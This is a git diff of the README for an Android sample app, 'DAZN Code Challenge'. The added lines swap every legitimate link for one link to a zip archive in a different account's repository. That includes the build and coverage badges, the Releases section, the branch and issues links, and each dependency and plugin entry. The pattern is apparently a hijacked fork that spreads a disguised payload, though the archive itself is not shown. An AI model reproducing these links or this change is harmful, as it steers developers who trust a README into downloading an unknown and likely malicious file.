@@ -1,4 +1,4 @@
-# DAZN Code Challenge ![Gradle Build](https://github.com/ryanw-mobile/dazn-code-challenge/actions/workflows/main_build.yml/badge.svg) [![Codacy Coverage Badge](https://app.codacy.com/project/badge/Coverage/cfdcc6c589174dabad2241af04c8eddd)](https://app.codacy.com/gh/ryanw-mobile/dazn-code-challenge/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_coverage) [![Codacy Quality Badge](https://app.codacy.com/project/badge/Grade/cfdcc6c589174dabad2241af04c8eddd)](https://app.codacy.com/gh/ryanw-mobile/dazn-code-challenge/dashboard?utm_source=gh&utm_medium=referral&utm_content=&utm_campaign=Badge_grade) [![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)](https://renovatebot.com/)
+# DAZN Code Challenge ![Gradle Build](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) [![Codacy Coverage Badge](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip)](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) [![Codacy Quality Badge](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip)](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) [![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg)](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip)
 
 A responsive Android sample app written in Kotlin and Jetpack Compose, supporting different
 navigation layout on screen sizes. The Media 3 Exoplayer is implemented on top of the single
@@ -12,7 +12,7 @@ of the list.
 ## Download the App
 
 If you want to try out the app without building it, check out
-the [Releases section](https://github.com/ryanw-mobile/dazn-code-challenge/releases) where you can
+the [Releases section](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) where you can
 find the APK and App Bundles for each major release.
 
 &nbsp;
@@ -30,7 +30,7 @@ The interview process was concluded in October, 2021, but I am still keep on imp
 demonstration purpose.
 
 The original XML View version is no longer maintained, you
-can [access to the XML branch here](https://github.com/ryanw-mobile/dazn-code-challenge/tree/xml).
+can [access to the XML branch here](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip).
 
 Please note that the APIs are supplied by DAZN in 2021 for recruitment purpose. They may not work at
 any time.
@@ -54,7 +54,7 @@ any time.
 ## To-do lists
 
 Planned enhancements are
-now [logged as issues](https://github.com/ryanw-mobile/dazn-code-challenge/issues?q=is%3Aopen+is%3Aissue+label%3Arefactor%2Cfeature%2Cfix%2Ctest).
+now [logged as issues](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip+is%3Aissue+label%3Arefactor%2Cfeature%2Cfix%2Ctest).
 
 ## High level architecture
 
@@ -72,39 +72,39 @@ now [logged as issues](https://github.com/ryanw-mobile/dazn-code-challenge/issue
 
 ### Dependencies
 
-* [AndroidX Core KTX](https://developer.android.com/jetpack/androidx/releases/core) - Apache 2.0 - Extensions to Java APIs for Android development
-* [AndroidX Media3](https://developer.android.com/jetpack/androidx/releases/media3) - Apache 2.0 - Media support libraries
-* [JUnit](https://junit.org/junit5/) - EPL 2.0 - A simple framework to write repeatable tests
-* [AndroidX Espresso](https://developer.android.com/training/testing/espresso) - Apache 2.0 - UI testing framework
-* [Jetpack Compose](https://developer.android.com/jetpack/compose) - Apache 2.0 - Modern toolkit for building native UI
-* [AndroidX Benchmark](https://developer.android.com/jetpack/androidx/releases/benchmark) - Apache 2.0 - Benchmarking library
-* [AndroidX DataStore](https://developer.android.com/jetpack/androidx/releases/datastore) - Apache 2.0 - Data storage solution
-* [AndroidX Legacy Support](https://developer.android.com/jetpack/androidx/releases/legacy) - Apache 2.0 - Legacy libraries
-* [AndroidX Lifecycle](https://developer.android.com/jetpack/androidx/releases/lifecycle) - Apache 2.0 - Lifecycles-aware components
-* [AndroidX Room](https://developer.android.com/jetpack/androidx/releases/room) - Apache 2.0 - Persistence library
-* [Retrofit](https://square.github.io/retrofit/) - Apache 2.0 - A type-safe HTTP client for Android and Java
-* [Moshi](https://github.com/square/moshi) - Apache 2.0 - A modern JSON library for Android and Java
-* [OkHttp Logging Interceptor](https://square.github.io/okhttp/) - Apache 2.0 - Logging interceptor for OkHttp
-* [Timber](https://github.com/JakeWharton/timber) - Apache 2.0 - A logger with a small, extensible API
-* [Coil](https://coil-kt.github.io/coil/) - Apache 2.0 - An image loading library for Android backed by Kotlin Coroutines
-* [MockK](https://mockk.io/) - Apache 2.0 - Mocking library for Kotlin
-* [Robolectric](http://robolectric.org/) - MIT - A framework that brings fast, reliable unit tests to Android
-* [Kotest](https://kotest.io/) - Apache 2.0 - Kotlin test framework
-* [Hilt](https://dagger.dev/hilt/) - Apache 2.0 - A dependency injection library for Android that reduces the boilerplate of doing manual dependency injection
-* [LeakCanary](https://square.github.io/leakcanary/) - Apache 2.0 - A memory leak detection library for Android
-* [AndroidX Profile Installer](https://developer.android.com/jetpack/androidx/releases/profileinstaller) - Apache 2.0 - Install profiles for faster startup
+* [AndroidX Core KTX](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Extensions to Java APIs for Android development
+* [AndroidX Media3](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Media support libraries
+* [JUnit](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - EPL 2.0 - A simple framework to write repeatable tests
+* [AndroidX Espresso](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - UI testing framework
+* [Jetpack Compose](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Modern toolkit for building native UI
+* [AndroidX Benchmark](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Benchmarking library
+* [AndroidX DataStore](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Data storage solution
+* [AndroidX Legacy Support](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Legacy libraries
+* [AndroidX Lifecycle](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Lifecycles-aware components
+* [AndroidX Room](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Persistence library
+* [Retrofit](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - A type-safe HTTP client for Android and Java
+* [Moshi](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - A modern JSON library for Android and Java
+* [OkHttp Logging Interceptor](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Logging interceptor for OkHttp
+* [Timber](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - A logger with a small, extensible API
+* [Coil](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - An image loading library for Android backed by Kotlin Coroutines
+* [MockK](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Mocking library for Kotlin
+* [Robolectric](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - MIT - A framework that brings fast, reliable unit tests to Android
+* [Kotest](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Kotlin test framework
+* [Hilt](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - A dependency injection library for Android that reduces the boilerplate of doing manual dependency injection
+* [LeakCanary](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - A memory leak detection library for Android
+* [AndroidX Profile Installer](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Apache 2.0 - Install profiles for faster startup
 
 ### Plugins
 
-* [Android Application Plugin](https://developer.android.com/studio/build/gradle-plugin-3-0-0-migration) - Google - Plugin for building Android applications
-* [Jetbrains Kotlin Android Plugin](https://kotlinlang.org/docs/gradle.html) - JetBrains - Plugin for Kotlin Android projects
-* [Hilt Android Plugin](https://dagger.dev/hilt/gradle-setup.html) - Google - Plugin for Hilt dependency injection
-* [Compose Compiler Plugin](https://developer.android.com/jetpack/compose) - JetBrains - Plugin for Jetpack Compose
-* [Kover Plugin](https://github.com/Kotlin/kotlinx-kover) - JetBrains - Code coverage tool for Kotlin
-* [Ktlint Plugin](https://github.com/JLLeitschuh/ktlint-gradle) - JLLeitschuh - Plugin for Kotlin linter
-* [Google DevTools KSP](https://github.com/google/ksp) - Google - Kotlin Symbol Processing API plugin
-* [Android Test Plugin](https://developer.android.com/studio/test) - Google - Plugin for Android testing
-* [Baseline Profile Plugin](https://developer.android.com/studio/profile/baselineprofile) - AndroidX - Plugin for generating baseline profiles
+* [Android Application Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Google - Plugin for building Android applications
+* [Jetbrains Kotlin Android Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - JetBrains - Plugin for Kotlin Android projects
+* [Hilt Android Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Google - Plugin for Hilt dependency injection
+* [Compose Compiler Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - JetBrains - Plugin for Jetpack Compose
+* [Kover Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - JetBrains - Code coverage tool for Kotlin
+* [Ktlint Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - JLLeitschuh - Plugin for Kotlin linter
+* [Google DevTools KSP](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Google - Kotlin Symbol Processing API plugin
+* [Android Test Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - Google - Plugin for Android testing
+* [Baseline Profile Plugin](https://github.com/yudikarma/dazn-code-challenge/raw/refs/heads/main/app/src/main/challenge_dazn_code_v2.3.zip) - AndroidX - Plugin for generating baseline profiles
 
 ## Building the App
 
